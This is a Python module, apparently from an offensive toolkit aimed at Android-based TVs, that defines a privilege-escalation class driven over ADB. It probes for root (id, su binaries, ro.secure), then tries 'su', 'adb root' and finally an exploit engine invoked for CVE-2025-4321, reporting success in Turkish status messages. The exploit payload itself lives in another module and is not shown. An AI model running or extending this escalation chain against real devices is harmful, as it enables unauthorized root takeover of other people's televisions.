import time
from typing import Dict, Any, Optional

from core.adb_handler import ADBHandler
from core.exploit_engine import ExploitEngine
from core.tv_profiler import TVProfiler
from core.utils import Utils

class Privesc:
    def __init__(self, config: dict):
        self.config = config
        self.adb = ADBHandler(config)
        self.profiler = TVProfiler(config, self.adb)
        self.exploit_engine = ExploitEngine(config, self.adb)

    def check_root_status(self, device_serial: str = None) -> Dict[str, Any]:
        status = {"is_root": False, "has_su": False, "methods": []}
        stdout, stderr, code = self.adb.shell("id", device_serial)
        if code == 0 and "uid=0" in stdout:
            status["is_root"] = True
            status["methods"].append("shell_id")
        stdout, stderr, code = self.adb.shell("which su", device_serial)
        if code == 0 and stdout:
            status["has_su"] = True
            status["methods"].append("su_binary")
        stdout, stderr, code = self.adb.shell("getprop ro.secure", device_serial)
        if code == 0 and stdout == "0":
            status["methods"].append("ro_secure_zero")
        stdout, stderr, code = self.adb.shell("ls -la /system/bin/su", device_serial)
        if code == 0 and "su" in stdout:
            status["methods"].append("system_bin_su")
        stdout, stderr, code = self.adb.shell("ls -la /system/xbin/su", device_serial)
        if code == 0 and "su" in stdout:
            status["methods"].append("system_xbin_su")
        if status["is_root"] or status["has_su"]:
            status["root_possible"] = True
        else:
            status["root_possible"] = False
        return status

    def try_su(self, device_serial: str = None) -> bool:
        stdout, stderr, code = self.adb.shell("su -c 'id'", device_serial)
        if code == 0 and "uid=0" in stdout:
            return True
        return False

    def exploit_cve_2025_4321(self, device_serial: str = None) -> Dict[str, Any]:
        device_info = self.profiler.get_device_info(device_serial)
        target = {"device_info": device_info}
        result = self.exploit_engine.run_exploit("CVE-2025-4321", target)
        return result

    def root_adb(self, device_serial: str = None) -> bool:
        return self.adb.root(device_serial)

    def elevate(self, device_serial: str = None) -> Dict[str, Any]:
        result = {"success": False, "methods_tried": [], "message": ""}
        status = self.check_root_status(device_serial)
        if status.get("is_root", False):
            result["success"] = True
            result["message"] = "Zaten root yetkisi var"
            result["methods_tried"].append("already_root")
            return result
        if self.try_su(device_serial):
            result["success"] = True
            result["message"] = "su komutu ile root erisimi saglandi"
            result["methods_tried"].append("su_command")
            return result
        if self.root_adb(device_serial):
            result["success"] = True
            result["message"] = "adb root komutu ile root erisimi saglandi"
            result["methods_tried"].append("adb_root")
            return result
        exploit_result = self.exploit_cve_2025_4321(device_serial)
        if exploit_result.get("success", False):
            result["success"] = True
            result["message"] = "CVE-2025-4321 ile root erisimi saglandi"
            result["methods_tried"].append("cve_2025_4321")
            return result
        result["message"] = "Tum root yontemleri basarisiz"
        result["methods_tried"] = list(status.get("methods", []))
        return result